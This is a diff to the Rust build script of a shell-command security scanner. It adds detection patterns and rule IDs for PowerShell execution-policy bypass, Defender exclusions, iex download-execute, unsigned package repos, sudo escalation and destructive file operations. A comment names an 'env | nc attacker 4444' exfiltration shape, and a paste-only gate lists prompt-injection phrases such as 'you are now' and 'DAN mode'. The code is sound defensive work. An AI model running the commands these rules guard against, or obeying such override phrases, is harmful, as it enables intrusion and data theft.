@@ -49,8 +49,7 @@ struct PrivKeyPattern {
 fn main() {
     let out_dir = env::var("OUT_DIR").unwrap();
     let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
-    // Data files live under the crate directory so they are included in the
-    // crate tarball and `cargo publish` / `cargo install` work correctly.
+    // Data files live under the crate dir so they ship in the crate tarball.
     let data_dir = Path::new(&manifest_dir).join("assets").join("data");
 
     compile_confusables(&data_dir, &out_dir);
@@ -259,8 +258,8 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
             );
         }
         let canonical = parts[1];
-        // Validate: canonical values with alphabetic chars must be lowercase
-        // (comparison pipeline lowercases input, so uppercase canonicals are dead code)
+        // Canonicals must be lowercase — the comparison pipeline lowercases input,
+        // so an uppercase canonical would be dead code.
         if canonical.chars().any(|c| c.is_ascii_uppercase()) {
             panic!(
                 "ocr_confusions.tsv:{}: canonical value {:?} contains uppercase — \
@@ -272,7 +271,7 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
         entries.push((parts[0].to_string(), canonical.to_string()));
     }
 
-    // Sort by confusable length descending (multi-char first for longest-match)
+    // Sort by confusable length descending (multi-char first, for longest-match).
     entries.sort_by_key(|e| std::cmp::Reverse(e.0.len()));
 
     let mut code = String::new();
@@ -298,17 +297,12 @@ fn compile_ocr_confusions(data_dir: &Path, out_dir: &str) {
     fs::write(&out_path, code).unwrap();
 }
 
-/// Declarative pattern table for Tier 1 / Tier 3 extraction.
+/// Declarative pattern table for Tier 1 / Tier 3 extraction. build.rs assembles
+/// the exec-time and paste-time regexes from these fragments at compile time.
 ///
-/// Each entry has:
-/// - id: human-readable extractor name
-/// - tier1_exec_fragments: regex fragments that trigger Tier 1 for exec context
-/// - tier1_paste_fragments: regex fragments that trigger Tier 1 for paste context (exec + extras)
-/// - notes: documentation
-///
-/// INVARIANT: Any Tier 3 extraction path MUST have a corresponding Tier 1 fragment here.
-/// A missing fragment means the extractor can silently miss input — a security bug.
-/// build.rs assembles exec-time and paste-time regexes from these fragments at compile time.
+/// INVARIANT: any Tier 3 extraction path MUST have a corresponding Tier 1
+/// fragment here — a missing fragment lets the extractor silently miss input (a
+/// security bug).
 struct PatternEntry {
     id: &'static str,
     tier1_exec_fragments: &'static [&'static str],
@@ -379,6 +373,32 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         tier1_exec_fragments: &[r"(?i:Invoke-Expression)"],
         tier1_paste_only_fragments: &[],
         notes: "PowerShell Invoke-Expression (iex) full name",
+    },
+    PatternEntry {
+        id: "ps_set_execution_policy",
+        tier1_exec_fragments: &[
+            r"(?i:Set-ExecutionPolicy)\b",
+            // PR #121 item 12: `-ex` is the shortest unambiguous prefix of
+            // `-ExecutionPolicy`; without it, `powershell -ex Bypass …` fast-exits
+            // at tier-1 before reaching the tier-3 rule.
+            r"-(?i:ExecutionPolicy|ep|ex)\b",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell Set-ExecutionPolicy Bypass — cmdlet form and powershell.exe -ExecutionPolicy / -ep / -ex flag form",
+    },
+    PatternEntry {
+        id: "ps_defender_exclusion",
+        tier1_exec_fragments: &[r"(?i:Add-MpPreference)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell Add-MpPreference -ExclusionPath/-ExclusionProcess/-ExclusionExtension — Defender exclusion",
+    },
+    PatternEntry {
+        id: "ps_iex_inline",
+        // `[\s(]` accepts both `iex (iwr …)` and `iex(iwr …)` while requiring a
+        // real command boundary (`\b` would also match `iex2 …`).
+        tier1_exec_fragments: &[r"(?i:iex)[\s(]"],
+        tier1_paste_only_fragments: &[],
+        notes: "PowerShell iex as leading command (inline download-execute form)",
     },
     PatternEntry {
         id: "curl",
@@ -485,6 +505,33 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         notes: "Package manager install commands — trigger threat DB lookup",
     },
     PatternEntry {
+        id: "install_command",
+        tier1_exec_fragments: &[
+            // Tier-1 gate only; the install-command rules tokenize subcommands/flags.
+            r"\b(?:apt|apt-get|aptitude)\s+(?:install|update|upgrade|add-repository)\b",
+            r"\bdnf\s+(?:install|upgrade|update)\b",
+            r"\b(?:yum|zypper)\s+install\b",
+            r"\bpacman\s+-[A-Za-z]*S",
+            r"\b(?:yay|paru|trizen)\s",
+            r"\bbrew\s+(?:install|tap|reinstall)\b",
+            r"\bkubectl\s+(?:apply|create|replace)\b",
+            r"\bhelm\s+(?:install|upgrade|repo)\b",
+            r"\bterraform\s+(?:init|get)\b",
+            // High-risk markers that can appear without the tool name on the line.
+            r"sources\.list",
+            r"add-apt-repository\b",
+            r"\[trusted=yes\]",
+            r"--allow-unauthenticated\b",
+            r"--allow-insecure-repositories\b",
+            r"--nogpgcheck\b",
+            r"(?i)gpgcheck\s*=\s*0",
+            r"(?i)SigLevel\s*=\s*Never",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Package-manager / infrastructure install commands and their \
+                high-risk markers (unsigned repos, disabled GPG checks, remote manifests)",
+    },
+    PatternEntry {
         id: "env_var_dangerous",
         tier1_exec_fragments: &[
             r"LD_PRELOAD",
@@ -573,6 +620,114 @@ const PATTERN_TABLE: &[PatternEntry] = &[
         notes:
             "Non-ASCII bytes in pasted content (analysis trigger only, never sole reason to WARN)",
     },
+    PatternEntry {
+        id: "cloud_cli",
+        // M8 ch1 — coarse tier-1 probe for cloud/k8s CLIs; the precise
+        // destructive-verb match lives in `rules::context::check`. `aws-vault` is
+        // listed because `aws-vault exec … -- aws s3 rm …` is the same shape with a
+        // credential wrapper. `\b` keeps `aws-` / `azimuth` out of the hit list.
+        tier1_exec_fragments: &[
+            r"\b(?:kubectl|kustomize|helm|argocd|aws|aws-vault|gcloud|az)\b",
+        ],
+        tier1_paste_only_fragments: &[],
+        notes: "Cloud / k8s CLIs for production-context destructive-command detection (M8 ch1)",
+    },
+    PatternEntry {
+        id: "ssh_cmd",
+        // M8 ch2 — coarse tier-1 probe for `ssh`; the precise destructive-verb +
+        // host-label match lives in `rules::ssh_context::check`. `\b` keeps `sshd`,
+        // `sshpass`, `_ssh` out — only the standalone `ssh` token matches.
+        tier1_exec_fragments: &[r"\bssh\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "SSH invocations for remote-session destructive-command detection (M8 ch2)",
+    },
+    PatternEntry {
+        id: "iac_cmd",
+        // M8 ch3 — coarse tier-1 probe for IaC CLIs; precise apply/destroy/
+        // -auto-approve matching lives in `rules::iac::check`. `\b` keeps
+        // `terraformer`, `pulumictl`, `tofu-config` out of the hit list.
+        tier1_exec_fragments: &[r"\b(?:terraform|pulumi|tofu)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "IaC CLIs for apply-gate / destroy detection (M8 ch3)",
+    },
+    PatternEntry {
+        id: "docker_exec",
+        // M8 ch5 — the `docker_command` entry does not match `exec`, so the
+        // prod-container exec rule needs its own tier-1 admission ticket. (The
+        // privileged-run / bind-mount rules ride on `docker_command`.)
+        tier1_exec_fragments: &[r"(?:docker|podman)\s+exec"],
+        tier1_paste_only_fragments: &[],
+        notes: "Docker / Podman exec subcommand for prod-container detection (M8 ch5)",
+    },
+    PatternEntry {
+        id: "sudo_cmd",
+        // M8 ch4 — coarse tier-1 probe for `sudo`; the precise matching lives in
+        // `rules::sudo::check`. `\b` keeps `sudoers` / `pseudo-` out. Catches
+        // direct `sudo …` invocations the pipe-to-interpreter regex misses (e.g.
+        // `sudo sh`, `sudo tee /etc/foo`).
+        tier1_exec_fragments: &[r"\bsudo\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "Sudo invocations for escalation-gate detection (M8 ch4)",
+    },
+    PatternEntry {
+        id: "env_to_network_sink",
+        // M9 ch4 — tier-1 ticket for the no-URL `env | nc attacker 4444` shape
+        // (`env | curl https://x` already passes via `standard_url`). The precise
+        // check lives in `env_guard::check_printenv_to_network_sink`; `\b` keeps
+        // `printenvironment` / `environment` out.
+        tier1_exec_fragments: &[r"\b(?:printenv|env)\b\s*\|"],
+        tier1_paste_only_fragments: &[],
+        notes: "printenv/env piped to a network sink (M9 ch4)",
+    },
+    PatternEntry {
+        id: "destructive_fs_op",
+        // M10 ch1 — coarse tier-1 probe for destructive fs ops; the precise match
+        // lives in the cheap, filesystem-free `blast_radius::cheap_check` (hot
+        // path). The full filesystem-walking `blast_radius::simulate` runs ONLY
+        // under `tirith preview`, never the hot path (see `engine::analyze`). `\b`
+        // keeps `charm`/`firmware` out; the cheap check re-verifies the leader, so
+        // a coarse hit on `mv` in prose is harmless.
+        tier1_exec_fragments: &[r"\b(?:rm|mv|chmod|find|rsync)\b"],
+        tier1_paste_only_fragments: &[],
+        notes: "Destructive filesystem ops for blast-radius cheap check (M10 ch1)",
+    },
+    PatternEntry {
+        id: "prompt_injection_seed",
+        // M7 ch5 — coarse paste-only gate for the prompt-injection rule; the
+        // precise regex lives in `rules::prompt_injection`. Kept `paste_only` (not
+        // `exec`) so the exec hot path isn't tripped by `git ignore-revs` or
+        // `# disregard this commit`. FileScan and the output pipeline reach the
+        // rule independently of this row; it stays explicit for the safeguard test.
+        tier1_exec_fragments: &[],
+        tier1_paste_only_fragments: &[
+            r"(?i)\bignore\b",
+            r"(?i)\bdisregard\b",
+            r"(?i)\bforget\b",
+            r"(?i)\boverride\b",
+            r"(?i)\bact\s+as\b",
+            r"(?i)\byou\s+are\s+now\b",
+            r"(?i)\bsystem\s*:",
+            r"(?i)\bDAN\s+mode\b",
+            r"(?i)\bdo\s+anything\s+now\b",
+            r"(?i)\bnew\s+instructions\s*:",
+            r"(?i)\bfrom\s+now\s+on\b",
+        ],
+        notes: "Prompt-injection seed phrases — coarse tier-1 gate for the paste context. \
+                The precise multi-word regex lives in `rules::prompt_injection`.",
+    },
+    PatternEntry {
+        id: "command_card_shell_comment",
+        // M11 ch1 — tier-1 ticket for the shell-comment card-reference channel
+        // (`# tirith-card: ./install-card.json` preceding a command); the precise
+        // parse + local-vs-URL classification is in `command_card::find_card_comment`.
+        // The `--card <path>` sidecar is a SEPARATE channel (via `ctx.card_ref`).
+        // v1 has no HTML-comment channel; a URL-shaped value is not fetched on the
+        // hot path (it warns "fetch first").
+        tier1_exec_fragments: &[r"#\s*tirith-card:"],
+        tier1_paste_only_fragments: &[],
+        notes: "Command-card shell-comment reference channel (M11 ch1) — \
+                `# tirith-card: <local-path>` preceding a command.",
+    },
 ];
 
 fn generate_tier1_regex(out_dir: &str) {
@@ -645,10 +800,9 @@ fn generate_tier1_regex(out_dir: &str) {
     }
 
     {
-        // Tier-1 must be a superset of GENERIC_SECRET_RE. The runtime regex
-        // allows an optional quote/bracket before the operator (["']?\]?),
-        // which cannot contain a literal " in the r"..." generated output,
-        // so .{0,2} is used as a permissive stand-in.
+        // Tier-1 must be a superset of GENERIC_SECRET_RE. `.{0,2}` is a permissive
+        // stand-in for the runtime regex's optional quote/bracket before the
+        // operator (a literal `"` can't appear in the generated `r"..."`).
         let generic_frag = r"(?i:key|token|secret|password)\w*.{0,2}\s*(?:[:=]|:=|=>|<-|>)";
         ids.push("credential_generic".to_string());
         paste_fragments.push(generic_frag.to_string());
@@ -685,12 +839,9 @@ fn generate_tier1_regex(out_dir: &str) {
     fs::write(&out_path, code).unwrap();
 }
 
-/// (snake_case id, PascalCase enum variant) for every RuleId in verdict.rs.
-/// Snake_case is used for TOML validation, PascalCase for generating the
-/// mitre_id match function.
-///
-/// Must match `enum RuleId` in src/verdict.rs exactly. The
-/// `test_all_rule_ids_have_explanation` test catches drift at CI time.
+/// (snake_case id, PascalCase variant) for every RuleId — snake for TOML
+/// validation, Pascal for the mitre_id match. Must match `enum RuleId` in
+/// src/verdict.rs exactly; `test_all_rule_ids_have_explanation` catches drift.
 const EXPECTED_RULES: &[(&str, &str)] = &[
     // Hostname
     ("non_ascii_hostname", "NonAsciiHostname"),
@@ -737,6 +888,13 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("credential_file_sweep", "CredentialFileSweep"),
     ("base64_decode_execute", "Base64DecodeExecute"),
     ("data_exfiltration", "DataExfiltration"),
+    ("wrapper_chain_too_deep", "WrapperChainTooDeep"),
+    (
+        "ps_set_execution_policy_bypass",
+        "PsSetExecutionPolicyBypass",
+    ),
+    ("ps_defender_exclusion", "PsDefenderExclusion"),
+    ("ps_inline_download_execute", "PsInlineDownloadExecute"),
     // Code file scan
     ("dynamic_code_execution", "DynamicCodeExecution"),
     ("obfuscated_payload", "ObfuscatedPayload"),
@@ -762,6 +920,7 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("mcp_duplicate_server_name", "McpDuplicateServerName"),
     ("mcp_overly_permissive", "McpOverlyPermissive"),
     ("mcp_suspicious_args", "McpSuspiciousArgs"),
+    ("mcp_server_drift", "McpServerDrift"),
     // Ecosystem
     ("git_typosquat", "GitTyposquat"),
     ("docker_untrusted_registry", "DockerUntrustedRegistry"),
@@ -770,6 +929,27 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("web3_rpc_endpoint", "Web3RpcEndpoint"),
     ("web3_address_in_url", "Web3AddressInUrl"),
     ("vet_not_configured", "VetNotConfigured"),
+    // Install-command rules
+    ("repo_add_from_pipe", "RepoAddFromPipe"),
+    ("unsigned_repo_trust", "UnsignedRepoTrust"),
+    ("gpg_check_disabled", "GpgCheckDisabled"),
+    ("kubectl_apply_remote", "KubectlApplyRemote"),
+    ("helm_untrusted_repo", "HelmUntrustedRepo"),
+    ("terraform_remote_module", "TerraformRemoteModule"),
+    ("brew_untrusted_tap", "BrewUntrustedTap"),
+    // CI / repo supply-chain scan rules
+    ("workflow_unpinned_action", "WorkflowUnpinnedAction"),
+    ("workflow_dangerous_trigger", "WorkflowDangerousTrigger"),
+    ("workflow_curl_pipe_shell", "WorkflowCurlPipeShell"),
+    ("workflow_untrusted_input", "WorkflowUntrustedInput"),
+    ("dockerfile_unpinned_image", "DockerfileUnpinnedImage"),
+    ("package_script_dangerous", "PackageScriptDangerous"),
+    // AI-relevant file hidden-content scan rules
+    ("notebook_hidden_content", "NotebookHiddenContent"),
+    ("notebook_suspicious_output", "NotebookSuspiciousOutput"),
+    ("agent_instruction_hidden", "AgentInstructionHidden"),
+    ("svg_script_embedded", "SvgScriptEmbedded"),
+    ("svg_external_reference", "SvgExternalReference"),
     // Threat intelligence — local DB
     ("threat_malicious_package", "ThreatMaliciousPackage"),
     ("threat_malicious_ip", "ThreatMaliciousIp"),
@@ -785,6 +965,38 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("threat_cisa_kev", "ThreatCisaKev"),
     ("threat_suspicious_package", "ThreatSuspiciousPackage"),
     ("threat_safe_browsing", "ThreatSafeBrowsing"),
+    // Package reputation rules (M6 ch6).
+    ("package_not_found_in_registry", "PackageNotFoundInRegistry"),
+    (
+        "package_maintainer_change_recent",
+        "PackageMaintainerChangeRecent",
+    ),
+    (
+        "package_ownership_transferred",
+        "PackageOwnershipTransferred",
+    ),
+    ("package_osv_advisory_active", "PackageOsvAdvisoryActive"),
+    ("package_dependency_confusion", "PackageDependencyConfusion"),
+    (
+        "package_install_script_network_call",
+        "PackageInstallScriptNetworkCall",
+    ),
+    ("package_repo_mismatch", "PackageRepoMismatch"),
+    // Package-policy gated rules (M6 ch7).
+    (
+        "package_policy_newer_than_days",
+        "PackagePolicyNewerThanDays",
+    ),
+    ("package_policy_low_downloads", "PackagePolicyLowDownloads"),
+    (
+        "package_policy_typosquat_distance",
+        "PackagePolicyTyposquatDistance",
+    ),
+    (
+        "package_policy_unknown_package_with_install_scripts",
+        "PackagePolicyUnknownPackageWithInstallScripts",
+    ),
+    ("package_policy_not_found", "PackagePolicyNotFound"),
     // Rendered content
     ("hidden_css_content", "HiddenCssContent"),
     ("hidden_color_content", "HiddenColorContent"),
@@ -803,10 +1015,220 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("private_key_exposed", "PrivateKeyExposed"),
     // Policy
     ("policy_blocklisted", "PolicyBlocklisted"),
+    ("agent_denied_by_policy", "AgentDeniedByPolicy"),
     // Custom
     ("custom_rule_match", "CustomRuleMatch"),
     // License/infrastructure
     ("license_required", "LicenseRequired"),
+    // Output-direction rules (M7 ch1) — fire from `engine::analyze_output`, which
+    // is byte-scan based and bypasses the tier-1 gate, so no PATTERN_TABLE entry.
+    ("output_osc52_clipboard_write", "OutputOsc52ClipboardWrite"),
+    ("output_hidden_text", "OutputHiddenText"),
+    ("output_fake_prompt", "OutputFakePrompt"),
+    (
+        "output_terminal_hyperlink_mismatch",
+        "OutputTerminalHyperlinkMismatch",
+    ),
+    ("output_title_manipulation", "OutputTitleManipulation"),
+    ("output_clear_screen", "OutputClearScreen"),
+    (
+        "output_truncated_escape_sequence",
+        "OutputTruncatedEscapeSequence",
+    ),
+    // M7 ch5 — prompt-injection seed phrases.
+    ("prompt_injection_in_output", "PromptInjectionInOutput"),
+    ("ignore_previous_instructions", "IgnorePreviousInstructions"),
+    // Operational-context rules (M8 ch1).
+    (
+        "context_prod_destructive_command",
+        "ContextProdDestructiveCommand",
+    ),
+    ("context_prod_write_operation", "ContextProdWriteOperation"),
+    (
+        "context_prod_credential_change",
+        "ContextProdCredentialChange",
+    ),
+    // SSH operational-context rules (M8 ch2).
+    (
+        "ssh_remote_destructive_on_labeled_host",
+        "SshRemoteDestructiveOnLabeledHost",
+    ),
+    (
+        "ssh_remote_shell_on_labeled_host",
+        "SshRemoteShellOnLabeledHost",
+    ),
+    // IaC operational-context rules (M8 ch3).
+    ("iac_apply_without_plan", "IacApplyWithoutPlan"),
+    ("iac_apply_auto_approve", "IacApplyAutoApprove"),
+    ("iac_apply_auto_approve_prod", "IacApplyAutoApproveProd"),
+    ("iac_destroy_prod", "IacDestroyProd"),
+    ("iac_plan_high_risk_changes", "IacPlanHighRiskChanges"),
+    ("iac_plan_hash_mismatch", "IacPlanHashMismatch"),
+    // Sudo-escalation rules (M8 ch4).
+    ("sudo_shell_spawn", "SudoShellSpawn"),
+    ("sudo_env_preserve_sensitive", "SudoEnvPreserveSensitive"),
+    ("sudo_tee_system_file", "SudoTeeSystemFile"),
+    ("sudo_download_install", "SudoDownloadInstall"),
+    (
+        "sudo_recursive_perms_broad_path",
+        "SudoRecursivePermsBroadPath",
+    ),
+    // Container-runtime rules (M8 ch5).
+    ("docker_run_privileged", "DockerRunPrivileged"),
+    (
+        "docker_run_sensitive_bind_mount",
+        "DockerRunSensitiveBindMount",
+    ),
+    ("docker_exec_prod_container", "DockerExecProdContainer"),
+    // Workstation hygiene rules (M9 ch1).
+    (
+        "hygiene_private_key_loose_perms",
+        "HygienePrivateKeyLoosePerms",
+    ),
+    ("hygiene_env_world_readable", "HygieneEnvWorldReadable"),
+    (
+        "hygiene_kubeconfig_group_readable",
+        "HygieneKubeconfigGroupReadable",
+    ),
+    (
+        "hygiene_npmrc_plaintext_token",
+        "HygieneNpmrcPlaintextToken",
+    ),
+    (
+        "hygiene_pypirc_plaintext_token",
+        "HygienePypircPlaintextToken",
+    ),
+    (
+        "hygiene_ssh_config_unsafe_include",
+        "HygieneSshConfigUnsafeInclude",
+    ),
+    (
+        "hygiene_git_credential_helper_store",
+        "HygieneGitCredentialHelperStore",
+    ),
+    (
+        "hygiene_shell_history_secret_like",
+        "HygieneShellHistorySecretLike",
+    ),
+    ("hygiene_cloud_creds_bad_perms", "HygieneCloudCredsBadPerms"),
+    ("hygiene_db_dump_in_repo", "HygieneDbDumpInRepo"),
+    // Persistence-mechanism state-change rules (M9 ch2).
+    (
+        "persistence_shell_rc_modified",
+        "PersistenceShellRcModified",
+    ),
+    (
+        "persistence_authorized_keys_new_entry",
+        "PersistenceAuthorizedKeysNewEntry",
+    ),
+    ("persistence_crontab_modified", "PersistenceCrontabModified"),
+    (
+        "persistence_launch_agent_added",
+        "PersistenceLaunchAgentAdded",
+    ),
+    (
+        "persistence_ssh_config_include",
+        "PersistenceSshConfigInclude",
+    ),
+    ("persistence_direnv_new_envrc", "PersistenceDirenvNewEnvrc"),
+    // Shell-alias / function risk rules (M9 ch3).
+    (
+        "alias_overrides_critical_command",
+        "AliasOverridesCriticalCommand",
+    ),
+    ("alias_contains_network_call", "AliasContainsNetworkCall"),
+    (
+        "alias_contains_credential_read",
+        "AliasContainsCredentialRead",
+    ),
+    ("alias_recently_added", "AliasRecentlyAdded"),
+    // Environment-variable lifecycle rules (M9 ch4).
+    (
+        "env_sensitive_exposed_to_unknown_script",
+        "EnvSensitiveExposedToUnknownScript",
+    ),
+    (
+        "env_sensitive_persisted_in_shell_rc",
+        "EnvSensitivePersistedInShellRc",
+    ),
+    ("env_printenv_to_network_sink", "EnvPrintenvToNetworkSink"),
+    // Executable-provenance + PATH-shadowing rules (M9 ch5).
+    ("exec_in_tmp", "ExecInTmp"),
+    ("exec_recently_modified", "ExecRecentlyModified"),
+    ("exec_world_writable", "ExecWorldWritable"),
+    ("exec_shadows_system_command", "ExecShadowsSystemCommand"),
+    ("exec_unsigned", "ExecUnsigned"),
+    ("exec_in_repo_bin", "ExecInRepoBin"),
+    (
+        "path_writable_dir_before_system",
+        "PathWritableDirBeforeSystem",
+    ),
+    ("path_duplicate_command_name", "PathDuplicateCommandName"),
+    ("path_dir_in_repo", "PathDirInRepo"),
+    ("path_dir_in_tmp", "PathDirInTmp"),
+    // Repo-hook / automation guard rules (M9 ch6).
+    ("repo_hook_network_call", "RepoHookNetworkCall"),
+    ("repo_hook_credential_read", "RepoHookCredentialRead"),
+    ("repo_hook_sudo", "RepoHookSudo"),
+    (
+        "repo_hook_suspicious_shell_pattern",
+        "RepoHookSuspiciousShellPattern",
+    ),
+    ("repo_hook_external_fetch", "RepoHookExternalFetch"),
+    // Blast-radius rules (M10 ch1).
+    ("blast_deletes_outside_repo", "BlastDeletesOutsideRepo"),
+    ("blast_writes_system_path", "BlastWritesSystemPath"),
+    ("blast_symlink_traversal", "BlastSymlinkTraversal"),
+    ("blast_empty_var_glob", "BlastEmptyVarGlob"),
+    ("blast_find_delete", "BlastFindDelete"),
+    ("blast_rsync_delete", "BlastRsyncDelete"),
+    ("blast_large_file_count", "BlastLargeFileCount"),
+    // Post-run diff rule (M10 ch2).
+    ("post_run_shell_rc_modified", "PostRunShellRcModified"),
+    // Tainted-content tracking rules (M10 ch3).
+    ("exec_of_tainted_file", "ExecOfTaintedFile"),
+    (
+        "command_sourced_from_tainted_file",
+        "CommandSourcedFromTaintedFile",
+    ),
+    // Anomaly-detection rules (M10 ch5, D2).
+    (
+        "anomaly_first_time_in_this_repo",
+        "AnomalyFirstTimeInThisRepo",
+    ),
+    ("anomaly_rare_in_baseline", "AnomalyRareInBaseline"),
+    // Command-card rules (M11 ch1).
+    ("command_card_verified", "CommandCardVerified"),
+    ("command_card_unverified", "CommandCardUnverified"),
+    ("command_card_mismatch", "CommandCardMismatch"),
+    // Repo command-manifest rules (M11 ch2).
+    ("repo_command_unknown", "RepoCommandUnknown"),
+    (
+        "repo_command_dangerous_pattern",
+        "RepoCommandDangerousPattern",
+    ),
+    // Honeytoken / canary rule (M11 ch3, D3).
+    ("canary_token_touched", "CanaryTokenTouched"),
+    // Paste-provenance rule (M12 ch1). Companion-file state + content-hash match;
+    // no PATTERN_TABLE entry (the trigger is not a regex), category "clipboard".
+    ("paste_source_mismatch", "PasteSourceMismatch"),
+    // AI-config drift rules (M13 ch5). Diff-triggered by `tirith ai diff`; no
+    // PATTERN_TABLE entry (the trigger is a snapshot diff), category "aifile".
+    (
+        "ai_config_hidden_instruction_added",
+        "AiConfigHiddenInstructionAdded",
+    ),
+    ("ai_config_tool_use_escalation", "AiConfigToolUseEscalation"),
+    // Cross-event correlation rules (W7). Session/post-process, fired by
+    // `correlate_session` over a bounded per-session event ring; no PATTERN_TABLE
+    // entry (the trigger is a sequence, not a single input). Category "correlation".
+    ("secret_write_then_network", "SecretWriteThenNetwork"),
+    (
+        "dependency_change_then_network",
+        "DependencyChangeThenNetwork",
+    ),
+    ("delete_then_force_push", "DeleteThenForcePush"),
+    ("mass_file_deletion", "MassFileDeletion"),
 ];
 
 const VALID_CATEGORIES: &[&str] = &[
@@ -829,6 +1251,23 @@ const VALID_CATEGORIES: &[&str] = &[
     "custom",
     "license",
     "threatintel",
+    "output",
+    "context",
+    "hygiene",
+    "persistence",
+    "aliases",
+    "exec",
+    "hooks",
+    "blast",
+    "taint",
+    "anomaly",
+    "command_card",
+    "commands_manifest",
+    "canary",
+    // M13 ch5 — AI-config drift rules, emitted by `tirith ai diff`.
+    "aifile",
+    // W7: cross-event correlation rules, emitted by `correlate_session`.
+    "correlation",
 ];
 
 #[derive(Deserialize)]
@@ -1001,10 +1440,8 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
     }
     code.push_str("        _ => None,\n    }\n}\n");
 
-    // Per-rule remediation lookup — single source of truth for `RuleId`-keyed
-    // "what to do instead" advice. Exhaustive: every RuleId has a remediation
-    // entry in the TOML (build.rs panics above if any are missing), so no
-    // wildcard arm is needed and the match cannot drift out of sync.
+    // Per-rule remediation lookup. Exhaustive (build.rs panics above if any TOML
+    // entry is missing), so the generated match needs no wildcard arm.
     code.push_str(
         "\n/// Per-rule remediation lookup generated from rule_explanations.toml.\n\
          ///\n\
